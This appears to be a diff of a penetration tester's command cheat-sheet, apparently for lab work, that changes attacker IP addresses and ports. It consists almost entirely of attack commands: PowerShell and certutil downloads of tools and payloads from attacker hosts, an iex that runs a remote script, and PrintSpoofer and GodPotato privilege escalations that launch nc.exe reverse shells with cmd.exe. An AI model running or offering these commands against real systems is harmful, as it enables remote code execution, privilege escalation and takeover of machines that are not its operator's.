@@ -102,16 +102,17 @@ transfer_files.ps1
 iwr -uri 192.168.45.178:8000/Certify.exe -usebasicparsing -outfile c:\windows\tasks\Certify.exe
 
 iex(iwr -uri 10.10.112.153:1234/transfer_files_ad.ps1 -usebasicparsing)
-certutil.exe -f -urlcache -split http://192.168.45.178:8000/svc_mssql443.exe svc_mssql443.exe
+certutil.exe -f -urlcache -split http://192.168.45.221:8000/svc_mssql443.exe svc_mssql443.exe
 wget http://192.168.45.178:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;
-certutil.exe -f -urlcache -split http://192.168.45.187:8000/
+certutil.exe -f -urlcache -split http://192.168.45.221:8000/
 192.168.49.140
 # Uploaded nc.exe from /usr/share/windows-resources/binaries/nc.exe
-.\PrintSpoofer64.exe -c ".\nc.exe -e cmd.exe 192.168.49.140 6969"
+.\PrintSpoofer64.exe -c ".\nc.exe -e cmd.exe 192.168.45.221 8000"
 
 .\PrintSpoofer64.exe -i -c C:\Windows\Tasks\binary.exe
 
-.\GodPotato-NET2.exe -cmd ".\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.163 6969"
+.\GodPotato-NET2.exe -cmd ".\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.221 8081"
+.\GodPotato-NET4.exe -cmd ".\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.221 8081"
 
 Start-Process -NoNewWindow .\shell443.exe
 
